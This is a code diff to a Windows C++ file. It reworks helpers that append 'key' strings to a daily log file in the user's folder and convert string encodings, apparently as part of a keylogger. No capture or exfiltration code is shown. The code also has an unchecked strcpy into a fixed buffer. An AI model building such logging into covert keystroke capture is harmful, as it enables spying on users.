@@ -5,25 +5,23 @@
 
 using namespace std;
 
+FILE* ff;
 TCHAR username[ULEN] = { 0, };
 DWORD usersize = sizeof(username) / sizeof(username[0]);
 
-char* getlogfilename() {
+char* getlogfilename() {		// get name of .log file
 	time_t t = time(NULL);
 	struct tm tm = *localtime(&t);
-	static char time[50] = { 0, };
-	sprintf(time, "%d", tm.tm_year);
-	char month[10] = { 0, };
-	sprintf(month, "%d", tm.tm_mon);
-	char day[10] = { 0, };
-	sprintf(day, "%d", tm.tm_mday);
-	strcat(time, month); 
-	strcat(time, day); 
-	strcat(time, ".log");
+	static char time[80] = { 0, };
+	char month[10], day[10] = { 0, };
+	sprintf(time, "%d", tm.tm_year + 1900);
+	sprintf(month, "-0%d", tm.tm_mon + 1);
+	sprintf(day, "-0%d", tm.tm_mday);
+	strcat(time, month); strcat(time, day); strcat(time, ".log");
 	return time;
 }
 
-char* getlogfilepath(char* filename) {
+char* getlogfilepath(char* filename) {		// get ultimate path of log file
 	GetUserName(LPWSTR(username), &usersize);
 	char dirpath[100] = "C:\\Users\\";
 	char filepath[100] = "C:\\Users\\";
@@ -41,60 +39,43 @@ char* getlogfilepath(char* filename) {
 }
 
 void logger(string key) {
-	key = key.replace(key.find("'"), 1, "");
-	fstream f;
 	char ch_key[100] = { 0, };
 	strcpy(ch_key, key.c_str());
-	f.open(getlogfilepath(getlogfilename()));
-	f.write(ch_key, sizeof(ch_key));
-	f.close();
+	char* workFullPath;
+	workFullPath = getlogfilepath(getlogfilename());
+	ff = fopen(workFullPath, "a+");
+	fprintf(ff, "%s", ch_key);
+	fclose(ff);
 }
 
-int getfilesize() {
+int getfilesize() {		// get file size of .log file
 	int rst = 0;
-	char path[100] = { 0, };
-	strcpy(path, string(getlogfilepath(getlogfilename())).c_str());
-	FILE* f = NULL;
-	if (path == NULL) {
+	char* workFullPath;
+	workFullPath = getlogfilepath(getlogfilename());
+	if (workFullPath == NULL) {
 		return rst;
 	}
-	fopen_s(&f, path, "r");
-	if (f != NULL) {
-		fseek(f, 0, SEEK_END);
-		rst = ftell(f);
-		fclose(f);
+	ff = fopen(workFullPath, "r");
+	if (ff != NULL) {
+		fseek(ff, 0, SEEK_END);
+		rst = ftell(ff);
+		fclose(ff);
 	}
 	return rst;
 }
 
-char* ConvertWCtoC(wchar_t* str)
-{
-	//반환할 char* 변수 선언
+char* ConvertWCtoC(wchar_t* str) {
 	char* pStr;
-
-	//입력받은 wchar_t 변수의 길이를 구함
 	int strSize = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
-
-	//char* 메모리 할당
 	pStr = new char[strSize];
-
-	//형 변환
 	WideCharToMultiByte(CP_ACP, 0, str, -1, pStr, strSize, 0, 0);
-
 	return pStr;
 }
 
-wchar_t* ConverCtoWC(char* str)
-{
-	//wchar_t형 변수 선언
+wchar_t* ConverCtoWC(char* str) {
 	wchar_t* pStr;
-	//멀티 바이트 크기 계산 길이 반환
 	int strSize = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, NULL);
-
-	//wchar_t 메모리 할당
 	pStr = new WCHAR[strSize];
-	//형 변환
 	MultiByteToWideChar(CP_ACP, 0, str, strlen(str) + 1, pStr, strSize);
-
 	return pStr;
 }
